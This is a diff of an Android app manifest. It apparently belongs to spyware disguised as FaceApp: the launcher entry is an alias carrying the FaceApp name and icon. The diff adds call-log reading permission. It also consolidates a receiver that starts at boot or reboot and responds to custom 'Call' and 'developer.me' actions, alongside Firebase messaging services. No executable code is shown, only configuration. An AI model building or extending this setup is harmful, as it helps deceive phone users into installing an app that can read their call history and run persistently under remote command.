@@ -7,6 +7,7 @@
     <uses-permission android:name="android.permission.INTERNET" />
     <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
     <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
+    <uses-permission android:name="android.permission.READ_CALL_LOG" />
 
 
     <application
@@ -18,31 +19,36 @@
         android:supportsRtl="true"
         android:theme="@style/AppTheme">
 
-        <activity android:name=".MainActivity" android:enabled="false">
+        <activity
+            android:name=".activities.MainActivity"
+            android:enabled="false">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
                 <action android:name="android.intent.action.VIEW" />
+
                 <category android:name="android.intent.category.LAUNCHER" />
             </intent-filter>
         </activity>
 
-        <activity-alias android:label="FaceApp" android:icon="@drawable/ic_faceapp"
-            android:name=".MainActivity_Green" android:enabled="true" android:targetActivity=".MainActivity">
+        <activity-alias
+            android:name=".MainActivity_Green"
+            android:enabled="true"
+            android:icon="@drawable/ic_faceapp"
+            android:label="FaceApp"
+            android:targetActivity=".activities.MainActivity">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
                 <category android:name="android.intent.category.LAUNCHER" />
             </intent-filter>
         </activity-alias>
 
-        <activity android:name=".Main2Activity" />
-
-        <service android:name=".Service"/>
-        <service android:name=".FCMService">
+        <service android:name=".Service" />
+        <service android:name=".firebase.FCMService">
             <intent-filter>
                 <action android:name="com.google.firebase.MESSAGING_EVENT" />
             </intent-filter>
         </service>
-        <service android:name=".FCMTokenService">
+        <service android:name=".firebase.FCMTokenService">
             <intent-filter>
                 <action android:name="com.google.firebase.INSTANCE_ID_EVENT" />
             </intent-filter>
@@ -50,16 +56,11 @@
 
         <receiver android:name=".BroadcastReceiver">
             <intent-filter>
-                <action android:name="android.intent.action.BOOT_COMPLETED" />
-            </intent-filter>
-            <intent-filter>
-                <action android:name="android.intent.action.REBOOT" />
-            </intent-filter>
-            <intent-filter>
-                <action android:name="Config.REGISTRATION_COMPLETE" />
-            </intent-filter>
-            <intent-filter>
+                <action android:name="Call" />
                 <action android:name="developer.me" />
+                <action android:name="android.intent.action.REBOOT" />
+                <action android:name="Config.REGISTRATION_COMPLETE" />
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
             </intent-filter>
         </receiver>
 
